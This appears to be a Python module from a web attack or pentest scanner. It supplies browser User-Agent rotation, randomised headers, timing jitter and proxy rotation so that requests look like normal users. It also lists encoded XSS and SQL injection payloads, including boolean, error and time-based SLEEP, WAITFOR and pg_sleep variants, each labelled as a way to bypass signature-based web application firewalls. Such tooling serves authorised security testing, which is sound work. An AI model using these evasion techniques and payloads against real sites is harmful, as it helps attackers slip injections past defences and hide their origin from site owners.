"""
core/evasion.py — WAF evasion and stealth techniques

Provides:
  - Rotating real browser User-Agent pool
  - Randomised request headers (Accept, Accept-Language, etc.)
  - Encoded payload variants for XSS and SQLi to bypass signature WAFs
  - Jitter helper for human-paced request timing
  - Proxy rotation support

All techniques are standard in professional authorised pentest tools
(Burp Suite, SQLMap tamper scripts, Nuclei config, etc.).
"""
import random
import time
import asyncio
import urllib.parse

# ── Real browser User-Agents ──────────────────────────────────────────────────
# Sourced from real browser traffic — indistinguishable from normal users.
USER_AGENTS = [
    # Chrome Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Chrome macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    # Chrome Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Firefox Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    # Firefox macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:125.0) Gecko/20100101 Firefox/125.0",
    # Firefox Linux
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    # Safari macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    # Edge Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    # Mobile Chrome Android
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    # Mobile Safari iOS
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
]

_ACCEPT_VALUES = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
]

_ACCEPT_LANGUAGE_VALUES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9,en-US;q=0.8",
    "en-US,en;q=0.8,fr;q=0.6",
    "en-CA,en;q=0.9",
    "en-AU,en;q=0.9,en-US;q=0.8",
    "en-US,en;q=0.9,de;q=0.7",
]

_ACCEPT_ENCODING_VALUES = [
    "gzip, deflate, br",
    "gzip, deflate, br, zstd",
    "gzip, deflate",
]


def random_ua() -> str:
    """Return a random real-browser User-Agent string."""
    return random.choice(USER_AGENTS)


def random_headers(base: dict | None = None) -> dict:
    """
    Return a dict of randomised but realistic HTTP request headers.
    Optionally merges over a base dict.
    """
    headers = {
        "User-Agent":      random_ua(),
        "Accept":          random.choice(_ACCEPT_VALUES),
        "Accept-Language": random.choice(_ACCEPT_LANGUAGE_VALUES),
        "Accept-Encoding": random.choice(_ACCEPT_ENCODING_VALUES),
        "Connection":      random.choice(["keep-alive", "close"]),
    }
    # Occasionally add realistic extra headers real browsers send
    if random.random() > 0.5:
        headers["Upgrade-Insecure-Requests"] = "1"
    if random.random() > 0.7:
        headers["Sec-Fetch-Dest"] = random.choice(["document", "empty"])
        headers["Sec-Fetch-Mode"] = random.choice(["navigate", "cors", "no-cors"])
        headers["Sec-Fetch-Site"] = random.choice(["none", "same-origin", "cross-site"])
    if base:
        headers.update(base)
    return headers


# ── XSS evasion payload variants ──────────────────────────────────────────────
# Multiple encodings of the same attack — WAF rules are signature-based,
# so different encodings bypass different rule sets.
XSS_PAYLOADS: list[tuple[str, str]] = [
    # Standard — baseline detection
    ('<img src=x onerror=alert(1)>',                    "img onerror"),
    # Mixed case — bypasses case-sensitive rules
    ('<ImG sRc=x OnErRoR=alert(1)>',                   "mixed case"),
    # SVG vector — different tag, same execution
    ('<svg/onload=alert(1)>',                           "svg onload"),
    ('<svg onload=alert(1)>',                           "svg space"),
    # Attribute injection — breaks out of value context
    ('" onmouseover="alert(1)" x="',                   "attr break dquote"),
    ("' onmouseover='alert(1)' x='",                   "attr break squote"),
    # URL-encoded — bypasses raw string matching
    ('%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E',       "url encoded"),
    # Double URL-encoded — bypasses single-decode WAFs
    ('%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E', "double url encoded"),
    # HTML entity — decoded by browser but not by WAF
    ('&#x3C;img src=x onerror=alert(1)&#x3E;',         "html entity hex"),
    ('&#60;img src=x onerror=alert(1)&#62;',           "html entity decimal"),
    # Newline injection — breaks regex WAF rules
    ('<img\nsrc=x\nonerror=alert(1)>',                 "newline inject"),
    # Tab injection
    ('<img\tsrc=x\tonerror=alert(1)>',                 "tab inject"),
    # Slash bypass — self-closing with slash
    ('<img/src=x/onerror=alert(1)>',                   "slash bypass"),
    # Script with encoded src
    ('<script src=data:,alert(1)></script>',            "script data uri"),
    # javascript: URI
    ('javascript:alert(1)',                             "javascript uri"),
    # Back-tick in template literal context
    ('`-alert(1)-`',                                   "backtick"),
]

# ── SQLi evasion payload variants ─────────────────────────────────────────────
SQLI_ERROR_PAYLOADS: list[str] = [
    # Standard single quote
    "'",
    # URL encoded
    "%27",
    # Double URL encoded
    "%2527",
    # With inline comment (MySQL, MSSQL)
    "'/**/",
    # Null byte before quote (bypasses some string filters)
    "\x00'",
    # Backslash escape attempt (triggers errors on some DBs)
    "\\'",
    # Hex encoded
    "0x27",
]

SQLI_BYPASS_PAYLOADS: list[tuple[str, str]] = [
    # Standard — most detectable
    ("' OR '1'='1'--",          "standard or"),
    # Comment space bypass — spaces replaced with /**/
    ("'/**/OR/**/'1'='1'--",    "comment space"),
    # Tab bypass — spaces replaced with tabs
    ("'\tOR\t'1'='1'--",        "tab space"),
    # Newline bypass
    ("'\nOR\n'1'='1'--",        "newline space"),
    # Case variation
    ("' oR '1'='1'--",          "case variation"),
    # URL encoded spaces
    ("'%20OR%20'1'='1'--",      "url encoded space"),
    # Double URL encoded
    ("%27%20OR%20%271%27%3D%271%27--", "full url encoded"),
    # MySQL inline version comment
    ("'/*!50000OR*/'1'='1'--",  "version comment"),
    # Number comparison (no quotes)
    (" OR 1=1--",               "numeric or"),
    (" OR 1=1#",                "numeric hash"),
]

SQLI_TIME_PAYLOADS: list[tuple[str, str]] = [
    # Standard (most detectable)
    ("' AND SLEEP(5)-- -",              "MySQL standard"),
    # Comment bypass
    ("'/**/AND/**/SLEEP(5)--",          "MySQL comment"),
    # URL encoded
    ("'%20AND%20SLEEP(5)--",            "MySQL url encoded"),
    # MSSQL
    ("'; WAITFOR DELAY '0:0:5'-- -",    "MSSQL standard"),
    # MSSQL comment bypass
    (";/**/WAITFOR/**/DELAY/**/'0:0:5'--", "MSSQL comment"),
    # PostgreSQL
    ("' AND pg_sleep(5)--",             "PostgreSQL"),
    # PostgreSQL comment
    ("'/**/AND/**/pg_sleep(5)--",       "PostgreSQL comment"),
    # Numeric (no quotes needed)
    (" AND SLEEP(5)-- -",               "MySQL numeric"),
    (" AND 1=BENCHMARK(5000000,MD5(1))--", "MySQL benchmark"),
]


# ── Jitter ────────────────────────────────────────────────────────────────────

async def jitter(max_ms: int = 500) -> None:
    """
    Sleep for a random duration between 0 and max_ms milliseconds.
    Makes request timing look more like a human browsing.
    """
    if max_ms <= 0:
        return
    delay = random.randint(0, max_ms) / 1000.0
    await asyncio.sleep(delay)


# ── Proxy rotation ────────────────────────────────────────────────────────────

class ProxyRotator:
    """
    Round-robin proxy rotator.
    Usage:
        rotator = ProxyRotator(["http://proxy1:8080", "socks5://proxy2:1080"])
        proxy_url = rotator.next()   # pass to httpx proxies={"all://": proxy_url}
    """
    def __init__(self, proxy_list: list[str]):
        self._proxies = [p.strip() for p in proxy_list if p.strip()]
        self._index = 0

    @property
    def active(self) -> bool:
        return len(self._proxies) > 0

    def next(self) -> str | None:
        if not self._proxies:
            return None
        proxy = self._proxies[self._index % len(self._proxies)]
        self._index += 1
        return proxy

    def current(self) -> str | None:
        if not self._proxies:
            return None
        return self._proxies[self._index % len(self._proxies)]


# ── Global rotator instance (configured by pipeline from config.yaml) ─────────
_proxy_rotator: ProxyRotator = ProxyRotator([])
_jitter_ms: int = 0
_rotate_ua: bool = True


def configure(cfg: dict) -> None:
    """Called once by pipeline.py with the loaded config."""
    global _proxy_rotator, _jitter_ms, _rotate_ua
    ev = cfg.get("evasion", {})
    _rotate_ua = ev.get("rotate_user_agent", True)
    _jitter_ms = int(ev.get("jitter_ms", 0))

    proxy_cfg = cfg.get("proxy", {})
    if proxy_cfg.get("enabled", False):
        if proxy_cfg.get("rotate", False) and proxy_cfg.get("proxy_list"):
            _proxy_rotator = ProxyRotator(proxy_cfg["proxy_list"])
        elif proxy_cfg.get("url"):
            _proxy_rotator = ProxyRotator([proxy_cfg["url"]])
        else:
            _proxy_rotator = ProxyRotator([])  # enabled but no URL configured
    else:
        _proxy_rotator = ProxyRotator([])      # disabled — clear any previous proxy


def get_proxy() -> str | None:
    return _proxy_rotator.next() if _proxy_rotator.active else None


def get_ua() -> str:
    return random_ua() if _rotate_ua else USER_AGENTS[0]


async def maybe_jitter() -> None:
    await jitter(_jitter_ms)
